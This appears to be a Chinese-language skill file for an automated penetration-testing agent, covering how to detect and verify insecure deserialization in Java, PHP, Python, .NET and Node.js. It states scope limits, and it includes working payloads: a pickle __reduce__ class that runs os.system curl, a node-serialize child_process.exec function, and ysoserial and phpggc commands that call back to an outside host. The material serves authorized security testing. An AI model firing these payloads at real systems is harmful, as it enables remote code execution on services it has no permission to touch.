---
name: insecure-deserialization
description: 检测和利用不安全的反序列化漏洞，覆盖 Java、PHP、Python、.NET 和 Node.js 主流框架。
category: web
source: xalgorix
tags:
  - 反序列化
  - RCE
  - 对象注入
  - ysoserial
required_tools:
  - curl
  - ysoserial（Java 利用）
  - phpggc（PHP 利用）
---

# 不安全的反序列化

## 适用场景

- 目标应用使用了 Java 序列化、PHP `unserialize()`、Python `pickle`、.NET `BinaryFormatter` 或 Node.js `node-serialize`。
- 请求或 Cookie 中包含 Base64 编码的二进制数据。
- 应用接受序列化对象作为输入（如 API 中的 JSON 包含 `__class__` 或 `__type` 字段）。

## 授权边界

- **反序列化利用可导致远程代码执行，仅在 scope 明确允许时进行。**
- 先用无害 gadget 验证漏洞存在，不执行系统命令。
- RCE 验证仅执行 `whoami` / `hostname`，不进行提权或持久化。

## 前置条件

- 已识别可能包含序列化数据的请求或存储位置。
- 对于 Java 利用：已安装 `ysoserial`。
- 对于 PHP 利用：已安装 `phpggc`。
- 了解目标技术栈，以选择合适的 gadget 链。

## 执行步骤

### 步骤 1：识别序列化格式

```bash
# 常见序列化格式特征
# Java: 以 rO0 或 aced 开头的 Base64 字符串
# PHP: a:1:{...}、O:8:"stdClass":...、s:5:"value"
# Python pickle: 以 gASV 开头的 Base64 或 \x80\x04\x95 二进制
# .NET: 以 AAEAAAD///// 开头的 Base64 或 TypeConverter
# Node.js: 以 {" 开头的 JSON 但包含 _$$ND_FUNC$$
```

### 步骤 2：Java 反序列化

```bash
# 识别序列化数据（通常在 Cookie 或隐藏字段中）
# Base64 编码以 rO0 开头

# 使用 ysoserial 生成 payload
# DNS 回连探测（验证漏洞存在，不执行命令）
java -jar ysoserial.jar URLDNS "http://<interactsh_server>" | base64 -w0

# 将生成的 payload 替换到请求中
curl -X POST "https://<target>/api/data" \
  -H "Cookie: session=<base64_payload>" \
  -d '...'
```

观察 Interactsh 是否收到 DNS 查询。

### 步骤 3：PHP 反序列化

```bash
# 识别 PHP 序列化数据
# 特征：a:数字:{...}、O:数字:"类名":数字:{...}

# 使用 phpggc 生成 payload
phpggc -s <gadget_chain> <function> <command>

# 常用 gadget 链：
# Laravel: RCE1, RCE2
# Symfony: RCE1, RCE2
# WordPress: 根据插件版本选择
```

### 步骤 4：Python Pickle 反序列化

```bash
# 识别 pickle 数据
# Base64 编码以 gASV 开头

# 简单验证 payload
python3 -c "
import pickle, base64, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://<interactsh_server>',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
"
```

### 步骤 5：.NET 反序列化

```bash
# 识别 .NET 序列化数据
# Base64 编码以 AAEAAAD///// 开头

# 使用 ysoserial.net 生成 payload
# ysoserial.net -g <gadget> -f JsonFormatter -c "command"
```

### 步骤 6：Node.js 反序列化

```bash
# 检查 node-serialize 或其他反序列化库的使用
# 测试 payload（node-serialize）
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl <interactsh_server>')}"}
```

## 停止条件

- 如果目标使用未知或自定义序列化格式，记录格式特征后停止，不盲目尝试各种 gadget。
- 反序列化利用可能导致服务崩溃（特别是错误 payload），测试时注意服务状态。
- 仅在确认漏洞后进行一次无害验证（DNS 回连），不执行多次 RCE。

## 输出格式

- 序列化数据类型和位置。
- 确认的库/框架及版本。
- 验证方法（DNS 回连 / 无害命令）。
- 可用 gadget 链（如有）。
- 受影响程度评估。

## 验收标准

1. 对所有包含疑似序列化数据的请求进行了格式识别。
2. 至少使用了一种语言对应的 gadget 生成工具。
3. 漏洞验证使用 DNS 回连或无害命令，未执行破坏性操作。
4. 测试针对的主要技术栈（Java/PHP/Python）均已覆盖。
